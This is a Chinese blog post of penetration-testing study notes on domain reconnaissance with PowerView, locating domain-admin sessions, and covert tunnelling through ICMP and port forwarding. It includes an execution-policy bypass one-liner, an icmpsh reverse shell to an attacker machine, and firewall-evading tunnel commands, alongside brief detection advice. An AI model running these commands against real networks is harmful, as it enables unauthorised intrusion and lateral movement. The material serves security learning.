<p>NES 脚本下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
<pre class="line-numbers language-none"><code class="language-none">nmap --script&#x3D;NSE脚本 -p 端口 IP
#nmap --script&#x3D;smb-os-discovery.nse -p 445 192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102110706552.png" alt="image-20231102110706552"></p>
<h3 id="PowerView-脚本">PowerView 脚本</h3>
<p>说明：PowerView 脚本中包含了一系列的 powershell 脚本，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102114134000.png" alt="image-20231102114134000"></p>
<p>PowerView 脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p>
<p>信息收集相关的脚本</p>
<ul>
<li><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code></li>
<li><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，<mark>在使用时不需要管理员权限</mark>。</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#修改PowerShell执行策略
Set-ExecutionPolicy Unrestricted
Import-Module PowerView
Get-Command -Module PowerView

#或者使用绕过执行策略一句话执行
powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module PowerView; Invoke-UserHunter&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102121448169.png" alt="image-20231102121448169"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102121242948.png" alt="image-20231102121242948"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102121302041.png" alt="image-20231102121302041"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102115426090.png" alt="image-20231102115426090"></p>
<p>PowerView 中的其他信息收集模块：</p>
<ul>
<li>Get-NetDomain:获取当前用户所在域名称</li>
<li>Get-NetUser：获取所有用户的详细信息</li>
<li>Get-NetDomainController：获取所有域控制器的信息</li>
<li>Get-NetComputer：获取域内所有机器的详细信息</li>
<li>Get-NetOU：获取域中的OU信息</li>
<li>Get-NetGroup：获取所有域内组和组成员信息</li>
<li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li>
<li>Get-NetShare：获取当前域内所有的网络共享信息</li>
<li>Get-NetSession：获取指定服务器的会话</li>
<li>Get-NetRDPSession：获取指定服务器的远程连接</li>
<li>Get-NetProcess：获取远程主机的进程</li>
<li>Get-UserEvent：获取指定用户的日志</li>
<li>Get-ADObject：获取活动目录的对象</li>
<li>Get-NetGPO：获取域内所有组的策略对象</li>
<li>Get-DomainPolicy：获取域默认策略或域控制器策略</li>
<li>Invoke-UserHunter：获取域用户登录的计算机信息及该用户是否有本地管理员权限</li>
<li>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</li>
<li>Invoke-UserEventHunter：根据用户日志查询某域用户登录过哪些域机器</li>
</ul>
<h3 id="Empire">Empire</h3>
<p>说明：Empire中也有类似Invoke-UserEventHunter的模块，即<code>user_hunter</code>模块，全称<code>powershell/situational_awareness/network/powerview/user_hunter</code>，可查看哪个用户登陆过哪台主机，可用于查找域管理员登录的机器</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102221252362.png" alt="image-20231102221252362"></p>
<h2 id="6、查找域管理员进程">6、查找域管理员进程</h2>
<p>说明：先说一下渗透路径，在拿到一台机器立足点之后，会进行提权至该机器的本地管理员用户，通过分析当前机器的用户登录列表和会话信息，能够知道有哪些用户登录过这台机器，那么接下来我们就要再进一步，定位域管理员位置，将权限从本地管理员用户提权至域管理员用户。如果发现获得权限的用户都不是域管理员用户，或者域管理员没有登录过我们拿下的机器，那么就要先扩散到其他内网机器上，在进行同样的步骤，直至拿到域管理员权限。</p>
<h3 id="获取域管理员列表">获取域管理员列表</h3>
<pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231102233248253.png" alt="image-20231102233248253"></p>
<h3 id="列出本机的所有进程及进程用户">列出本机的所有进程及进程用户</h3>
<pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103000145912.png" alt="image-20231103000145912"></p>
<p>说明：如果在列出的进程中看到了用户名为域管理员用户名的话，就找到了域管理员进程，如果能找到域管理员登录进程，就能进而收集域管理员的凭据</p>
<h3 id="查询域控制器的域管理会话">查询域控制器的域管理会话</h3>
<p>说明：想要查询域控制器的域管理会话，需要两个要素。一是，在域控制器中查询域用户会话列表；二是，要在域控制器中查询域管理员列表。这两个列表一对比(术语上叫做交叉引用)，即可得到域管理会话的列表</p>
<p>具体步骤：</p>
<ol>
<li>使用net命令查询域控制器列表</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Computers&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="2">
<li>使用net命令查询域管理员列表</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="3">
<li>使用netsess查询所有活动域用户的会话列表</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">netsess -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>对比域用户会话列表和域管理员列表(交叉引用)：</p>
<ol>
<li>方法一</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">#将域控制器列表写入dcs.txt，将域管理员列表写入admins.txt，并与netsess.exe放在同一目录下
#运行以下脚本，会在当前目录下生成一个文本文件sessions.txt
for &#x2F;F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; for &#x2F;F %a in (admins.txt) Do @type sessions.txt | @findstr &#x2F;I %a
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol start="2">
<li>方法二：使用网上现成的脚本GDA【<a target="_blank" rel="noopener" href="https://github.com/nullbind/Other-Projects/tree/master/GDA%E3%80%91%E3%80%82%E5%AE%83%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E5%AE%8C%E6%88%90%E4%BB%A5%E4%B8%8A%E6%95%B4%E4%B8%AA%E8%BF%87%E7%A8%8B">https://github.com/nullbind/Other-Projects/tree/master/GDA】。它可以自动完成以上整个过程</a></li>
</ol>
<h1>BloodHound 的使用(滞留)</h1>
<p>说明：<mark>BloodHound 使用可视化图形显示域环境中的关系</mark>，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p>
<h1>基本架构与内网常见软件</h1>
<h2 id="常见的Web基本架构">常见的Web基本架构</h2>
<ul>
<li>ASP + Access + IIS 5.0/6.0 + Windows Sever 2003</li>
<li>ASPX + MSSOL + IIS 7.0/7.5 + Windows Sever 2008</li>
<li>PHP + MySOL + IIS</li>
<li>PHP + MySOL + Apache</li>
<li>PHP + MySOL + Ngnix</li>
<li>JSP + MySOL + Ngnix</li>
<li>JSP + MSSOL + Tomcat</li>
<li>JSP + Oracle + Tomcat</li>
</ul>
<h2 id="内网常见软件">内网常见软件</h2>
<p>TeamViewer</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103181221555.png" alt="image-20231103181221555"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103181439693.png" alt="image-20231103181439693"></p>
<h1>域内网段划分</h1>
<p>说明：在判断内网环境时，首先需要分析内网IP地址的分布情况。<mark>一般可以通过内网中的路由器、交换机等设备，以及SNMP、弱口令等，获取内网网络拓扑或DNS域传送的信息。大型公司通常都有内部网站，因此也可通过内部网站的公开链接来分析IP地址分布情况</mark>。公司场景下，常见的域内网段划分有以下几种：</p>
<ul>
<li>按部门划分</li>
<li>按楼层划分</li>
<li>按地区划分</li>
</ul>
<p>内网通常可分为DMZ、办公区、核心区(生产区)，下面对这几个区域的情况进行逐一介绍</p>
<ol>
<li>DMZ：<mark>在实际的渗透测试中，大多数情况下，在外围Web环境中拿到的权限都在DMZ中。这个区域不属于严格意义上的内网</mark>。如果访问控制策略配置合理，DMZ就会处在从内网能够访问DMZ，而从DMZ访问不能内网的状态</li>
<li>办公区：顾名思义，是指日常工作区。办公区的安全防护水平通常不高，<mark>基本的防护机制大多为杀毒软件或主机入侵检测产品</mark>。在实际的网络环境中，攻击者在获取办公区的权限后，会利用内网信任关系来扩大攻击面。不过，在一般情况下，攻击者很少能够直接到达办公区。攻击者如果想进入办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。<mark>办公区按照系统可分为OA系统、邮件系统、财务系统、文件共享系统、企业版杀毒系统、内部应用监控系统、运维管理系统等，按照网段可分为域管理网段、内部服务器系统网段、各 部门分区网段等</mark></li>
<li>核心区：核心区内一般存放着企业最重要的数据、文档等信息资产(例如域控制器、核心生产机器等)，安全设置也最为严格。根据业务的不同，相关服务器可能存在于不同的网段中。在实际网络环境中，攻击者通过分析服务器上运行的服务和进程，就可以推断出目标主机使用的运维监控管理系统和安全防护系统(攻击者在内网中进行横向攻击时，会优先查找这些主机)。<mark>核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网段可分为业务网段，运维监控网段、安全管理网段等</mark></li>
</ol>
<p>因为大型企业或者单位的内部网络大都采用多层域结构甚至多级域结构，所以，<mark>在进行内网渗透测试时，首先要判断当前内网中是否存在多层域、当前计算机所在的域是几级子域、该子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、不同的域之间是否存在域信任关系等</mark></p>
<h1>隐藏通信隧道技术</h1>
<h2 id="1、隐藏通信隧道基础知识">1、隐藏通信隧道基础知识</h2>
<p>一般的网络通信，先在两台机器之间建立TCP连接，然后进行正常的数据通信。在知道IP地址的情况下，可以直接发送报文；如果不知道IP地址，就需要将域名解析成IP地址。<mark>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接的情况，如果发现异常，就会对通信进行阻断</mark>。</p>
<p>什么是隧道？这里的<mark>隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</mark></p>
<p>常用的隧道列举如下：</p>
<ul>
<li>网络层：IPv6隧道、ICMP隧道、GRE隧道</li>
<li>传输层：TCP隧道、UDP隧道、常规端口转发</li>
<li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li>
</ul>
<h2 id="2、判断内网的连通性-是否出网">2、判断内网的连通性(是否出网)</h2>
<p>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议(TCP、HTTP、DNS、ICMP等)及端口通信的情况。<mark>常见的允许流量流出的端口有 80、8080、443、53、110、123等</mark>。常用的内网连通性判断方法如下：</p>
<h3 id="使用ICMP协议-ICMP连通性检测">使用ICMP协议(ICMP连通性检测)</h3>
<p>简单介绍一下ICMP协议：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103233503387.png" alt="image-20231103233503387"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103233553733.png" alt="image-20231103233553733"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103233559641.png" alt="image-20231103233559641"></p>
<pre class="line-numbers language-none"><code class="language-none">#使用ICMP协议判断内网的连通性
ping www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="使用TCP协议-TCP连通性检测">使用TCP协议(TCP连通性检测)</h3>
<p>netcat(简称nc)被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，<mark>通过使用TCP或UDP协议的网络连接读写数据</mark>。</p>
<pre class="line-numbers language-none"><code class="language-none">#使用TCP协议判断内网的连通性
nc -zv 外网IP 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="使用http协议-http连通性检测">使用http协议(http连通性检测)</h3>
<p>curl 是一个利用 URL 规则在命令行下工作的综合文件传输工具，支持文件的上传和下载。<mark>curl 命令不仅支持HTTP、HTTPS、FTP 等众多协议</mark>，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux 操作系统自带 curl 命令。</p>
<pre class="line-numbers language-none"><code class="language-none">#使用http协议判断内网的连通性
curl www.baidu.com:80
#如果远程主机开启了相应的端口，会输出相应的端口信息；如果远程主机没有开通相应的端口，则没有任何提示，按“Ctrl+C”键即可断开连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="使用DNS协议-DNS连通性检测">使用DNS协议(DNS连通性检测)</h3>
<h4 id="windows下">windows下</h4>
<p>nslookup是Windows操作系统自带的DNS探测命令，其用法如下所示。在没有指定vps-ip时，nslookup会从系统网络的TCP/IP属性中读取DNS服务器的地址</p>
<pre class="line-numbers language-none"><code class="language-none">nslookup www.baidu.com vps-ip
#nslookup www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>更多nslookup使用方法，可以输入“nslookup”后，按回车键，然后输入“help”命令进行查询</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104192602331.png" alt="image-20231104192602331"></p>
<h4 id="linux下">linux下</h4>
<p>dig是Linux默认自带的DNS探测命令，其用法如下所示。在没有指定vps-ip时，dig会到/etc/resolv.conf文件中读取系统配置的DNS服务器的地址。如果vps-ip为192.168.43.1将解析百度网的IP地址，说明目前DNS协议是连通的。更多使用方法，可在Linux命令行环境中输入“dig -h”命令获取。</p>
<pre class="line-numbers language-none"><code class="language-none">dig @vps-ip www.baidu.com
#dig www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还有一种情况是流量不能直接流出，而是通过在内网中设置代理服务器，经过代理服务器流出，常见于通过企业办公网段上网的场景。常用的判断方法如下：</p>
<ol>
<li>
<p>查看网络连接，判断是否存在与其他机器的 8080(不绝对)等端口的连接(可以尝试运行“ping -n 1 -a ip”命令)</p>
</li>
<li>
<p>查看内网中是否有主机名类似于“proxy”的机器</p>
</li>
<li>
<p>查看IE浏览器的直接代理</p>
</li>
<li>
<p>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看</p>
</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104202414611.png" alt="image-20231104202414611"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104202855690.png" alt="image-20231104202855690"></p>
<ol start="5">
<li>执行如下命令，利用curl工具进行确认</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">curl www.baidu.com    #通
curl -x proxy-ip:port www.baidu.com    #不通<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="3、网络层隧道技术">3、网络层隧道技术</h2>
<h3 id="IPv6隧道工具使用">IPv6隧道工具使用</h3>
<p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。为了在IPv4海洋中传递IPv6信息，可以将IPv4作为隧道载体，将IPv6报文整体封装在IPv4数据报文中，使IPv6报文能够穿过IPv4海洋，到达另一个IPv6小岛。</p>
<p>IPv6隧道的工作过程：</p>
<ol>
<li>节点A要向节点B发送IPv6报文，首先需要在节点A和节点B之间建立一条隧道</li>
<li>节点A将IPv6报文封装在以节点B的IPv4地址为目的地址、以自己的IPv4地址为源地址的IPv4报文中，并发往IPv4海洋</li>
<li>在IPv4海洋中，这个报文和普通IPv4报文一样，经过IPv4的转发到达节点B</li>
<li>节点B收到此报文之后，解除IPv4封装，取出其中的IPv6报文</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104223226667.png" alt="image-20231104223226667"></p>
<p>支持IPv6的隧道工具有：</p>
<ul>
<li>socat</li>
<li>6tunnel</li>
<li>nt6tunnel</li>
</ul>
<h4 id="防御IPv6隧道攻击的方法">防御IPv6隧道攻击的方法</h4>
<p>针对IPv6隧道攻击，最好的防御方法是：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信，提高主机和应用程序的安全性。</p>
<h3 id="ICMP隧道工具使用">ICMP隧道工具使用</h3>
<p>说明：在内网中，<mark>如果攻击者使用各类上层隧道(例如HTTP隧道、DNS隧道、常规正/反向端口转发等)进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping数据包)，实现不受限制的网络访问</mark>。ICMP隧道简单、实用，是一个比较特殊的协议。<mark>在一般的通信协议里，如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要</mark>。最常见的ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相对应的回复与请求</p>
<p>用于建立 ICMP 隧道的工具常见有：</p>
<ul>
<li>ptunnel</li>
<li>icmpsh</li>
<li>icmptunnel</li>
<li>powershell icmp</li>
</ul>
<h4 id="ptunnel">ptunnel</h4>
<p>介绍：ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下</p>
<p>基本使用：</p>
<pre class="line-numbers language-none"><code class="language-none">-p: 指定跳板服务器 IP 地址
-lp: 监听本地 TCP 端口
-da: 指定访问目标的内网 IP 地址
-dp: 指定访问目标的端口
-m: 设置隧道最大并发数
-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）
-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）
-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103164832317.png" alt="image-20231103164832317"></p>
<pre class="line-numbers language-none"><code class="language-none">#在 Kali 攻击机上执行以下命令
ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix

#在 Linux Web 跳板机上执行以下命令
ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="icmpsh">icmpsh</h4>
<p>介绍：icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定(表现为一直刷屏，无法进行交互输入)</p>
<p>安装：</p>
<pre class="line-numbers language-none"><code class="language-none">#下载工具
git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git 
# 安装依赖，或者 pip2 install impacket
# 这里是安装Python的impacket类库，以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。
apt-get install python-impacket 
#关闭本地ICMP应答。如果要恢复ICMP应答，则设置为0
sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>IGMP协议介绍：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104225831214.png" alt="image-20231104225831214"></p>
<p>NTLM协议介绍：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104230218912.png" alt="image-20231104230218912"></p>
<p>Kerberos协议介绍：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104231701520.png" alt="image-20231104231701520"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104231714493.png" alt="image-20231104231714493"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231104231732302.png" alt="image-20231104231732302"></p>
<p>LDAP协议介绍：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105103533451.png" alt="image-20231105103533451"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105103549218.png" alt="image-20231105103549218"></p>
<p>基本使用：</p>
<pre class="line-numbers language-none"><code class="language-none">-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]
-d milliseconds    请求时间间隔（毫秒）
-o milliseconds    响应超时时间（毫秒）
-s bytes           最大数据缓冲区大小（字节）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103165034207.png" alt="image-20231103165034207"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103165049369.png" alt="image-20231103165049369"></p>
<pre class="line-numbers language-none"><code class="language-none">#在攻击机上运行
python2 icmpsh_m.py 172.16.214.6 172.16.214.2
#在目标机上运行
.&#x2F;icmpsh.exe -t 172.16.214.6 -d 500 -b 30 -s 128
#在目标主机上运行以上命令之后就能够在攻击机上得到shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="icmptunnel">icmptunnel</h4>
<p>介绍：icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版</p>
<p>安装：</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.git
cd icmptunnel
make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>基本使用：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103165551965.png" alt="image-20231103165551965"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231103165612000.png" alt="image-20231103165612000"></p>
<pre class="line-numbers language-none"><code class="language-none">#攻击机 IP：172.16.214.6
#目标机 IP：172.16.214.5

#在攻击机上运行
echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all        # 禁用 ICMP echo 回复，防止内核自己对ping包进行响应
.&#x2F;icmptunnel -s    # 开启服务端模式

#在攻击机上新开启一个终端运行
&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)

#在目标机上运行
echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all
.&#x2F;icmptunnel 172.16.214.6

#在目标机上新开启一个终端运行
&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.2 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)

#在攻击机上，尝试通过 ssh 进行连接
ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="防御ICMP隧道攻击的方法">防御ICMP隧道攻击的方法</h4>
<p><mark>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向，ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量</mark>。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下</p>
<ul>
<li>检测同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包</li>
<li>注意那些Payload大于64bit的ICMP数据包</li>
<li>寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包</li>
<li>检查ICMP数据包的协议标签。例如，icmptunnel会在所有的ICMP Payload前面添加“TUNL”标记来标识隧道，这就是特征</li>
</ul>
<h2 id="4、传输层隧道技术">4、传输层隧道技术</h2>
<p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。在渗透测试中，如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用Iptables打开指定端口。如果内网中存在一系列防御系统，TCP、UDP流量会被大量拦截</p>
<h3 id="lcx">lcx</h3>
<p>说明：lcx是一个基于Socket套接字实现的端口转发工具有Windows和Linux两个版本。Windows版为lcx.exe，Linux版为portmap。<mark>一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端，通过传入服务端的IP地址和端口，才能主动与服务器连接</mark></p>
<h4 id="windows下-2">windows下</h4>
<h5 id="内网端口转发">内网端口转发</h5>
<pre class="line-numbers language-none"><code class="language-none">#内网失陷主机
lcx.exe -slave rhost rport lhost lport
#公网代理主机
lcx.exe -listen lport1 lport2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>举个案例</p>
